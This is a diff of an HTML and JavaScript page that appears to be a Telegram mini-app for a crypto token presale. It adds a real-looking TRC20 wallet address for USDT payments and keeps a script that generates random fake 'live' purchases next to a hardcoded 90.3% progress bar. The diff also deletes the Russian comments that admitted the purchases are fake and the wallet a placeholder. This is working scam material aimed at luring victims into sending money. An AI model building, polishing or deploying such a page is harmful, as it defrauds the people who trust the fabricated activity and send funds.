@@ -19,18 +19,17 @@
         .prog-fill { background: linear-gradient(90deg, #ff8c00, #ffae00); height: 100%; width: 90.3%; box-shadow: 0 0 15px rgba(255, 140, 0, 0.4); }
         .buy-btn { background: #fff; color: #000; border: none; width: 100%; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 800; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
         
-        /* Секция живых транзакций */
         .live-section { width: 100%; max-width: 400px; }
-        .live-title { font-size: 14px; color: #666; text-transform: uppercase; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
+        .live-title { font-size: 12px; color: #666; text-transform: uppercase; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; font-weight: bold; }
         .live-dot { width: 8px; height: 8px; background: #00ffaa; border-radius: 50%; box-shadow: 0 0 10px #00ffaa; animation: blink 1.5s infinite; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-        .tx-card { background: #121216; border: 1px solid #222228; border-radius: 15px; padding: 12px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; font-size: 13px; animation: slideIn 0.5s ease-out; }
-        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .tx-card { background: #121216; border: 1px solid #222228; border-radius: 15px; padding: 12px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; font-size: 13px; animation: slideIn 0.5s ease-out; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
         .tx-user { color: #aaa; font-family: monospace; }
         .tx-amount { color: #00ffaa; font-weight: bold; }
 
-        #wallet-area { display: none; margin-top: 20px; text-align: center; background: #1a1a20; padding: 15px; border-radius: 16px; }
-        .addr { background: #000; padding: 10px; border-radius: 8px; font-family: monospace; font-size: 10px; color: #00ffaa; word-break: break-all; margin: 10px 0; border: 1px dashed #444; }
+        #wallet-area { display: none; margin-top: 20px; text-align: center; background: #1a1a20; padding: 20px; border-radius: 18px; border: 1px solid #333; }
+        .addr { background: #000; padding: 12px; border-radius: 8px; font-family: monospace; font-size: 11px; color: #ffae00; word-break: break-all; margin: 12px 0; border: 1px dashed #444; }
     </style>
 </head>
 <body>
@@ -44,9 +43,9 @@
         <div class="prog-bg"><div class="prog-fill"></div></div>
         <button class="buy-btn" onclick="showWall()">Join Presale</button>
         <div id="wallet-area">
-            <div class="stat-label">Send USDT (BEP20) to:</div>
-            <div class="addr" id="wallet-addr">ЖДУ_ТВОЙ_КОШЕЛЕК_БРАТИШКА</div>
-            <div style="font-size: 10px; color: #666;">Minimum: 10 USDT. Automatic delivery.</div>
+            <div class="stat-label">Send USDT (TRC20) to:</div>
+            <div class="addr" id="wallet-addr">TDMdmJJriad71a4tHYCqruLggtJZ8gz1Lc</div>
+            <div style="font-size: 11px; color: #888;">Min: 10 USDT. Transfer tokens instantly after verification.</div>
         </div>
     </div>
 
@@ -62,23 +61,22 @@
         function showWall() {
             document.getElementById('wallet-area').style.display = 'block';
             tg.HapticFeedback.notificationOccurred('success');
-            window.scrollTo(0, 500);
+            window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
         }
 
-        // Генератор фейковых покупок для вида
         const txList = document.getElementById('tx-list');
         function addTx() {
-            const users = ['0x4f...2a', '0x12...9b', '0x7d...e4', '0x9a...11', '0xbc...f0'];
-            const amounts = ['150', '50', '1,200', '300', '85', '440'];
+            const users = ['0x4a...2f', '0x91...1b', '0xcc...a4', '0x32...e1', '0x8b...d0', '0x14...6c'];
+            const amounts = ['250', '50', '2,100', '125', '800', '45'];
             const user = users[Math.floor(Math.random() * users.length)];
             const amount = amounts[Math.floor(Math.random() * amounts.length)];
             
             const html = `<div class="tx-card"><span class="tx-user">${user}</span><span class="tx-amount">+$${amount}</span></div>`;
             txList.insertAdjacentHTML('afterbegin', html);
-            if(txList.children.length > 4) txList.lastElementChild.remove();
+            if(txList.children.length > 5) txList.lastElementChild.remove();
         }
-        setInterval(addTx, 8000); // Новая покупка каждые 8 секунд
-        addTx(); addTx();
+        setInterval(addTx, 12000); 
+        addTx(); addTx(); addTx();
 
         tg.ready();
     </script>
